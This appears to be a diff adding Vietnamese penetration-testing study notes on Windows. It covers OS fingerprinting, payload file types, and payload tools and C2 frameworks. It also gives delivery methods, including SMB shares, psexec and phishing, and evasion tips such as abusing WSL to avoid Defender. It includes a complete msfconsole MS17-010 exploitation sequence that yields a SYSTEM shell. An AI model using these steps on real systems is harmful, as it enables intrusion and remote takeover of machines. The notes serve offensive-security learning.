@@ -1,0 +1,63 @@
+1. Xác định & Fingerprinting Windows
+  Ping TTL: Windows thường trả về TTL ≈ 128.
+  Nmap OS Detection:    nmap -O -v <target>
+  sẽ dự đoán hệ điều hành (ví dụ: Windows 10, Server 2016).
+  Banner grabbing: dùng nmap --script banner.nse hoặc netcat để xem dịch vụ trả về thông tin.
+
+2. File & Script thường dùng để tạo payload
+| Loại file        | Mô tả & Ứng dụng                                                                |
+| ---------------- | ------------------------------------------------------------------------------- |
+| **DLL**          | Thư viện liên kết động – có thể DLL hijacking/injection để leo thang đặc quyền. |
+| **Batch (.bat)** | Script DOS – tự động hóa nhiều lệnh, mở port, connect back.                     |
+| **VBS**          | VBScript – dùng trong phishing/macro attacks.                                   |
+| **MSI**          | Gói cài đặt Windows Installer – chạy qua `msiexec /i payload.msi`.              |
+| **PowerShell**   | Shell & ngôn ngữ script .NET – dùng tải payload, bypass AV, thực thi code.      |
+
+3. Công cụ & phương pháp tạo và triển khai payload
+  Tạo payload:
+    MSFvenom & Metasploit Framework – sinh payload reverse shell, meterpreter.
+    Nishang – PowerShell scripts cho offensive security.
+    Darkarmour – tạo binary khó phát hiện.
+    Mythic C2 – framework C2 thay thế Metasploit.
+    
+  Triển khai payload:
+    SMB shares (ADMIN$, C$) → copy file vào.
+    Impacket (psexec, wmiexec).
+    HTTP/FTP/TFTP server tự dựng.
+    Phishing email / USB drop.
+
+4. Ví dụ quy trình khai thác Windows bằng msfconsole 
+  Enumerate host → dùng Nmap quét port 80, 135, 139, 445.
+  Kiểm tra lỗ hổng MS17-010:
+    use auxiliary/scanner/smb/smb_ms17_010
+    set RHOSTS <target>
+    run
+  
+  Chọn exploit & payload:
+    use exploit/windows/smb/ms17_010_psexec
+    set RHOSTS <target>
+    set LHOST <your_vpn_ip>
+    set LPORT 4444
+    exploit
+  
+  Nhận Meterpreter shell:
+    meterpreter > getuid → NT AUTHORITY\SYSTEM
+    meterpreter > shell → vào cmd.exe trên máy đích.
+
+5. CMD vs PowerShell
+| Tiêu chí            | CMD                                         | PowerShell                                         |
+| ------------------- | ------------------------------------------- | -------------------------------------------------- |
+| **Độ tương thích**  | Có trên mọi Windows (kể cả XP)              | Có từ Windows 7 trở lên                            |
+| **Tính năng**       | Đơn giản, chỉ chạy lệnh MS-DOS              | Hiểu cmd + hỗ trợ cmdlets .NET                     |
+| **Log**             | Không lưu history                           | Lưu history → dễ bị phát hiện                      |
+| **Tình huống dùng** | Khi cần stealth hoặc chỉ chạy lệnh đơn giản | Khi cần script phức tạp, tương tác .NET, cloud API |
+
+
+6. WSL & PowerShell Core
+  WSL cho phép chạy Linux subsystem trên Windows → có thể bị lạm dụng để chạy payload không bị Windows Defender/Firewall giám sát.
+  PowerShell Core chạy được trên Linux, mở ra kịch bản tấn công chéo nền tảng
+
+7. 
+
+
+
